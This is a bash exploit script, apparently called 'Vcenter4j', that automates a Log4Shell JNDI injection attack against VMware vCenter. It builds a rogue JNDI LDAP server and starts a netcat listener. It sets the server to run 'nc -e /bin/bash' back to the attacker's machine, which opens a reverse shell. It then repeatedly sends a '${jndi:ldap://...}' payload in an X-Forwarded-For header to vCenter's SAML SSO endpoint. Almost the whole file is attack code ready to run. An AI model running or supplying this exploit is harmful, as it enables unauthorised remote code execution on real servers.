#!/bin/bash
#Author: Cham

figlet -c Vcenter4j

RED='\033[0;31m'
GREEN='\033[0;32m'
WHITE='\033[0;37m'
#checking required tools
#==============================================================
apt-get update >/dev/null

if [ -e /usr/bin/curl ]
	then
	echo -e "${WHITE}[Curl] ${GREEN}INSTALLED"
	else
	echo -e "${WHITE}[Curl] ${RED}NOT-INSTALLED"
	apt-get install curl -y
fi

if [ -e /bin/terminator ]
        then
        echo -e "${WHITE}[Terminator] ${GREEN}INSTALLED"
        else
        echo -e "${WHITE}[Terminator] ${RED}NOT-INSTALLED"
        apt-get install terminator -y
fi

if [ -e /bin/xterm ]
        then
        echo -e "${WHITE}[Xterm] ${GREEN}INSTALLED"
        else
        echo -e "${WHITE}[Xterm] ${RED}NOT-INSTALLED"
        apt-get install xterm -y
fi


if [ -e /bin/java ]
        then
        echo -e "${WHITE}[JAVA/JDK] ${GREEN}INSTALLED"
        else
        echo -e "${WHITE}[Curl] ${RED}NOT-INSTALLED"
        apt-get install default-jdk -y
fi



if [ -e /usr/bin/git ]
	then
	echo -e "${WHITE}[git] ${GREEN}INSTALLED"
	else
	echo -e "${WHITE}[git] ${RED}NOT-INSTALLED"
	apt-get install git -y
fi

ls /etc/maven >/dev/null
if [ $? -eq 0 ]
	then
        echo -e "${WHITE}[Maven] ${GREEN}INSTALLED"
        else
        echo -e "${WHITE}[Maven] ${RED}NOT-INSTALLED"
        apt-get install maven -y
fi
#Installation
#=============================================================
ls /usr/local/jndi >/dev/null
if [ $? -eq 0 ]
	then
	echo -e "${WHITE} JNDI-Cloned!"
	else
	echo -e "${RED}Please Wait... Make sure you are connected to Internet!"
	git clone https://github.com/veracode-research/rogue-jndi.git /usr/local/jndi >/dev/null
fi

cd /usr/local/jndi

if [ -e /usr/local/jndi/target/RogueJndi-1.1.jar ]
	then echo -e "${WHITE}Processing..."
	else
	echo -e "${WHITE} Please Wait Until the installation finish... "
	mvn package
fi

echo "[!] Remember this won't work with vcenter update later than 2021 and vcenter version 7.0.1"
echo
echo '[+] Please enter the Target Vcenter IP:'

read target

echo '[+] Please enter your local machine IP address e.g 192.168.1.20'
read ip
echo

echo '[+] please enter a listening port for your local machine'
read port

echo "[Please Wait ...]"

terminator -e "nc -lnvp $port; $SHELL" >/dev/null&
cd /usr/local/jndi
java -jar target/RogueJndi-1.1.jar --command "nc -e /bin/bash $ip $port" --hostname "$ip" >/dev/null&

echo "Please run the following command on another terminal just copy and past:"
echo

echo
echo

while true; do
	curl --insecure -vv -H "X-Forwarded-For: \${jndi:ldap://$ip:1389/o=tomcat}" "https://$target/websso/SAML2/SSO/vsphere.local?SAMLRequest="
	sleep 3
done
